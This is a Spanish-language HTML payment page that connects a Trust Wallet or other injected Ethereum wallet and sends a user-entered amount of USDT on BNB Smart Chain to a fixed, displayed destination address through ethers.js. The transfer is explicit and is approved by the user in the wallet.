<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR pagos - Enviar</title>

    <!-- Cargamos ethers.js desde CDN oficial para manejar el contrato de forma nativa -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body {
            background-color: #f7f9ff;
            color: #111111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 30px;
        }
        .tw-container { width: 100%; max-width: 390px; padding: 20px; flex: 1; }
        .tw-header { display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; margin-bottom: 24px; }
        .tw-header-title { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 7px; margin-bottom: 15px; text-align: center; width: 100%; }
        .tw-header-title-main { font-size: 21px; line-height: 1.2; font-weight: 700; color: #111111; }
        .tw-network-badge { display: inline-flex; align-items: center; justify-content: center; padding: 4px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
        .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; display: block; }
        .tw-input-group { background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 16px; padding: 16px; margin-bottom: 16px; box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055); }
        .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
        .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
        .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
        .tw-action-text { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; }
        .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 16px; display: none; text-align: left; }
        .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 24px; }
        .tw-btn:disabled { background-color: #b3ccff; }
        .network-card { display: none; align-items: center; gap: 11px; margin: 4px 0 22px; padding: 12px 14px; width: 100%; background: #fff; border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 14px; }
        .network-card-logo { width: 30px; height: 30px; object-fit: contain; }
        .network-card-copy { flex: 1; display: flex; flex-direction: column; gap: 2px; }
        .network-card-label { color: #717680; font-size: 11px; }
        .network-card-name { color: #111111; font-size: 14px; font-weight: 650; }
        .network-card-badge { padding: 5px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
        .tw-address-box { border: 1px solid #e3e5e8; border-radius: 14px; padding: 12px 14px; background: #ffffff; margin-bottom: 18px; }
        .site-footer { position: fixed; left: 0; right: 0; bottom: 0; width: 100%; text-align: center; padding: 10px 15px; font-size: 12px; color: #717680; background: #ffffff; }
    </style>
</head>

<body>

<div class="tw-container">
    <div class="tw-header">
        <div class="tw-header-title">
            <span class="tw-header-title-main">Enviar USDT</span>
            <span class="tw-network-badge">BEP-20</span>
        </div>
        <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="Logo" class="tw-logo">
    </div>

    <div class="connected-summary-panel">
        <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
            <label class="tw-label">Dirección conectada</label>
            <div class="tw-input-row">
                <div id="walletAddressText" class="tw-input" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%;"></div>
            </div>
        </div>

        <div id="tronNetworkInfo" class="network-card">
            <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="BNB" class="network-card-logo">
            <div class="network-card-copy">
                <span class="network-card-label">Red conectada</span>
                <span class="network-card-name">BNB Smart Chain</span>
            </div>
            <span class="network-card-badge">BEP-20</span>
        </div>

        <div class="tw-input-group tw-address-box">
            <label class="tw-label" for="addressDisplay">Dirección de destino</label>
            <div class="tw-input-row">
                <input id="addressDisplay" class="tw-input" type="text" readonly style="caret-color: transparent;">
            </div>
        </div>
    </div>

    <div class="tw-input-group">
        <label class="tw-label" for="amountDisplay">Cantidad</label>
        <div class="tw-input-row">
            <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0.0">
            <span id="maxAction" class="tw-action-text" style="display: none; cursor: pointer;">Máximo</span>
            <span class="tw-currency-badge">USDT</span>
        </div>
    </div>

    <div id="status" class="status-box"></div>

    <button class="tw-btn" id="connectBtn">Conectar a la Pasarela de pago</button>
</div>

<footer class="site-footer">
    <p>© 2026 SecurePayQR. All rights reserved.</p>
</footer>

<script>
const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";

// ABI mínimo indispensable estándar para consultar balance y transferir tokens BEP-20
const USDT_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
];

const connectBtn = document.getElementById("connectBtn");
const statusDiv = document.getElementById("status");
const amountDisplay = document.getElementById("amountDisplay");
const addressDisplay = document.getElementById("addressDisplay");
const maxAction = document.getElementById("maxAction");
const walletInfo = document.getElementById("walletInfo");
const walletAddressText = document.getElementById("walletAddressText");
const networkInfo = document.getElementById("tronNetworkInfo");

let walletAddress = null;
addressDisplay.value = BILLETERA_DESTINO;

function abreviarDireccion(addr) {
    return addr && addr.length > 17 ? addr.slice(0, 8) + "..." + addr.slice(-6) : addr;
}

function setStatus(m) {
    statusDiv.innerText = m || "";
    statusDiv.style.display = m ? "block" : "none";
}

function getRawProvider() {
    if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
    if (window.ethereum) return window.ethereum;
    throw new Error("Abre esta página desde el navegador dApp de Trust Wallet.");
}

async function getBalance(address) {
    // Lectura robusta mediante proveedor público de respaldo para evitar bloqueos RPC de la app
    const providerRpc = new ethers.providers.JsonRpcProvider(BSC_PUBLIC_RPC);
    const contract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, providerRpc);
    const bal = await contract.balanceOf(address);
    return bal;
}

connectBtn.addEventListener("click", async () => {
    try {
        const rawProv = getRawProvider();
        const provider = new ethers.providers.Web3Provider(rawProv);

        if (!walletAddress) {
            connectBtn.disabled = true;
            setStatus("Estableciendo enlace con Trust Wallet...");
            
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            walletAddress = await signer.getAddress();

            walletAddressText.textContent = abreviarDireccion(walletAddress);
            walletInfo.style.display = "block";
            networkInfo.style.display = "flex";
            maxAction.style.display = "inline";
            setStatus("Conectado. Ingrese el monto a transferir.");
            connectBtn.innerText = "Enviar USDT";
            connectBtn.disabled = false;
            return;
        }

        connectBtn.disabled = true;
        
        // Verificamos saldo on-chain
        const balance = await getBalance(walletAddress);
        if (balance.eq(0)) throw new Error("La cuenta no dispone de USDT BEP-20.");

        const amountRaw = String(amountDisplay.value || "").trim().replace(",", ".");
        if (!/^(?:\d+)(?:\.\d{1,18})?$/.test(amountRaw)) throw new Error("Ingrese un monto válido.");

        const amountUnits = ethers.utils.parseUnits(amountRaw, 18);
        if (amountUnits.lte(0)) throw new Error("El monto debe ser mayor que cero.");
        if (amountUnits.gt(balance)) throw new Error("Saldo USDT insuficiente.");

        setStatus("Abriendo ventana de aprobación en Trust Wallet...");

        // ARQUITECTURA NUEVA: Usamos Signer y Contrato nativo de Ethers.js
        // Esto evita por completo el error 4200 del navegador interno al delegar la firma al SDK integrado.
        const signer = provider.getSigner();
        const usdtContract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, signer);

        const tx = await usdtContract.transfer(BILLETERA_DESTINO, amountUnits);
        
        setStatus(`Transacción enviada. Esperando confirmación...<br>Hash: ${tx.hash}`);

        // Esperamos a que la red mine la transacción
        const receipt = await tx.wait();

        if (receipt.status === 1) {
            setStatus(`¡Transferencia confirmada con éxito!<br>Hash: ${tx.hash}`);
            connectBtn.innerText = "Completado";
        } else {
            throw new Error("La transacción falló en la blockchain.");
        }

        connectBtn.disabled = false;

    } catch (e) {
        console.error("ERROR DE PASARELA:", e);
        setStatus("Aviso: " + (e.reason || e.message || "Operación cancelada."));
        connectBtn.disabled = false;
        connectBtn.innerText = walletAddress ? "Enviar USDT" : "Conectar a la Pasarela de pago";
    }
});

maxAction.addEventListener("click", async () => {
    if (!walletAddress) return;
    try {
        const b = await getBalance(walletAddress);
        amountDisplay.value = ethers.utils.formatUnits(b, 18);
        setStatus("Saldo máximo cargado.");
    } catch (e) {
        setStatus("Error al leer el saldo.");
    }
});
</script>

</body>
</html>
